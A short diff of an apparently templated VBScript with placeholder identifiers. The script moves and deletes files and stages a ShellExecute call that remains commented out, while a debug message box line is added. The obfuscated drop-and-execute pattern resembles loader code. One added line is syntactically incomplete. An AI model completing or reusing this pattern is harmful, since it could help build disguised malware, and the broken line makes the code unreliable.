@@ -565,7 +565,7 @@ dim #var76#
 
 'msgbox  "1-De MF " & #var69# & #var8# & " para "& #var69# & #var73# & "1." & #var77#
 Set #var34# = CreateObject(#const51#)
-#var34#.MoveFile #var69# & #var8#, #var69# & #var73# & "1." & #var77#
+#var34#.MoveFile #var69# & #var8#, #var69# & #var73# '& "1." & #var77#
 #var34#.DeleteFile(#var69# & #var73# + #const56# & #var7#)
 
 
@@ -611,7 +611,7 @@ end if
 
 Set #var79# = CreateObject(#const59#)
 if (#const57# <> #const59#) then
-
+msgbox "Exec " & #var69#  & #var78# & #const60#  & #var73# & #var69# & 
 '#var79#.ShellExecute  #var69#  & #var78# & #const60# , #var73# , #var69# , #const63#, 1
 
 end if
